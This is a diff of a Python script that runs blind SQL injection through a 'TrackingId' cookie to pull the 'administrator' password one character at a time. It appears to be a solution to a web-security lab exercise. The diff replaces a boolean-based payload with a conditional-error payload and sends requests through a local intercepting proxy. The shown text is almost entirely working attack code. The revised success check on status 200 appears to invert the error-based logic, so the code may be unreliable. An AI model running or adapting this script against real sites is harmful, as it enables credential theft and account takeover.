@@ -5,17 +5,17 @@ import urllib
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'} 
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
 
-def sqli_password(url):
+def sqli_password(url): 
     password_extracted = ""
     for i in range(1,21):
         for j in range(32,126):
-            sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (i,j)
+            sqli_payload = "' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and ascii(substr(password,%s,1))='%s') || ' " % (i,j)
             sqli_payload_encoded = urllib.parse.quote(sqli_payload)
-            cookies = {'TrackingId': 'PASTE HERE' + sqli_payload_encoded, 'session': 'PASET HERE'}
-            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
-            if "Welcome" not in r.text:
+            cookies_sqli = {'TrackingId': 'PASTE HERE' + sqli_payload_encoded, 'session': 'PASTE HERE'}
+            r = requests.get(url, cookies=cookies_sqli, verify=False, proxies=proxies)
+            if r.status_code == 200:
                 sys.stdout.write('\r' + password_extracted + chr(j))
                 sys.stdout.flush()
             else:
